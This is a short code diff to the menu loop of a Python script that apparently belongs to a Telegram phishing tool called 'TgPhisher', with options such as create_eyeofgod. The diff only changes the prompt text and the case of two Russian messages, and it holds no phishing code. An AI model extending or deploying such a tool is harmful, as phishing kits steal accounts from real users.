@@ -55,7 +55,7 @@ def main():
     while True:
         display_banner()
 
-        choice = input(f"\n              {yellow}TgPhisher{reset}#{yellow}Run >>{reset} ")
+        choice = input(f"\n              {yellow}n{reset}#{yellow}n >>{reset} ")
 
         if choice == "1":
             create_eyeofgod()
@@ -64,10 +64,10 @@ def main():
         elif choice == "3":
             create_sv()
         elif choice == "0":
-            print("Выход из программы...")
+            print("выход из программы...")
             break
         else:
-            print("Неверный выбор!")
+            print("неверный выбор!")
 
 if __name__ == "__main__":
     main()
